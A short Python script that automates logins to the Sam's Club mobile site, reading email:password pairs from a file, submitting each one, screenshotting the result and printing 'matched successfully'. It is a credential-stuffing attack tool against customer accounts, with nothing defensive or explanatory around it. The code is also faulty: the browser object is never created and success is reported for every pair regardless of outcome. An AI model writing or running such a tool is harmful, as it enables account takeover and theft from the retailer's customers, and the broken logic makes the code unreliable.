from splinter import Browser
import time
import sys
import os
def windmill():
	bigdrain = open('slime.txt', 'r')
	text = bigdrain.readlines()
	for line in text:
		email,password = line.split(":")
		username1 = email
		password1 = password
		#browser = Browser(user_agent ="Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP)")
		browser.visit('https://m.samsclub.com/account/login?xid=hpg_login')
		time.sleep(1)

		browser.find_by_css('.sc-text-field-input').type(username1)
		browser.find_by_id('password').first.find_by_tag('input').type(password1)
		browser.find_by_css('.sc-primary-button').last.click()
		time.sleep(5)
		browser.is_text_present('Offers available, wait-time=18')
		browser.driver.save_screenshot(email + '-' + password + '.png')
		print email + ":" + password + "matched successfully!"
		
	bigdrain.close()
windmill()